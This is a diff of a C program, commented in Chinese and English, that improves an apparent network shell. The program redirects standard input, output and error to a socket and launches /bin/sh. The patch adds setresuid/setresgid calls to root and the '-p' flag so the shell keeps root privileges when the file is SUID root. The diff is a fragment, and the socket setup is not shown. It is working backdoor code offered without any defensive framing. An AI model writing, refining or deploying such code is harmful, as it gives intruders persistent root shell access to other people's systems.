@@ -47,6 +47,8 @@ int main(int argc, char *argv[]) {
                 // 只有当文件具有 SUID root 权限时，这两行才会生效
                 setuid(0); 
                 setgid(0);
+                setresuid(0, 0, 0); 
+                setresgid(0, 0, 0);
                 // 使用 dup2 将标准输入(0)、标准输出(1)、标准错误(2) 重定向到套接字 s
                 // Redirect stdin, stdout, and stderr to the socket
                 dup2(s, 0);
@@ -55,7 +57,7 @@ int main(int argc, char *argv[]) {
 
                 // 启动 shell (相当于 cmd.exe)
                 // Launch /bin/sh (equivalent to cmd.exe)
-                execl("/bin/sh", "sh", NULL);
+                execl("/bin/sh", "sh","-p", NULL);
                 
                 // 如果 execl 失败，退出子进程
                 exit(0); 
@@ -80,4 +82,5 @@ int main(int argc, char *argv[]) {
     return 0;
 
 }
+
 
